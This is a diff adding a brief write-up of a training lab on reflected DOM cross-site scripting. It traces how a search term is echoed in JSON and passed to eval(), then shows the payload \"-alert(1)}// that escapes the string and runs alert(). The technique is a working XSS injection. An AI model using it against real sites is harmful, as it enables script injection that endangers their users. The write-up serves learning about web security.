@@ -1,0 +1,27 @@
+Lab #6 - Reflected DOM XSS
+
+Vulnerability - This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+
+Goal - To solve this lab, create an injection that calls the alert() function.
+
+Analysis:
+1. When I search abc123 => Make a request: GET /?search=abc123 HTTP/2
+=> script has:  <script src='/resources/js/searchResults.js'></script>
+                <script>search('search-results')</script>
+=> The response: 
+{"results":[],"searchTerm":"abc123"}
+
+=> See that the reflected data is echoed in the response: 
+    eval('var searchResultsObj = ' + this.responseText);
+=> The reflected data is displayed on the browser in an unsafe way:
+h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
+
+2. When try to search alert(1) 
+=> the response is: {"results":[],"searchTerm":"alert(1)"}
+
+3. Try to escape string by adding a back slash "\" : \"-alert(1)
+=> the response is: {"results":[],"searchTerm":"\\"-alert(1)"}
+=> It is so good
+
+4. Try to close } of object and comment the rest of the object with payload: \"-alert(1)}//
+=> SUCCESSFULLY
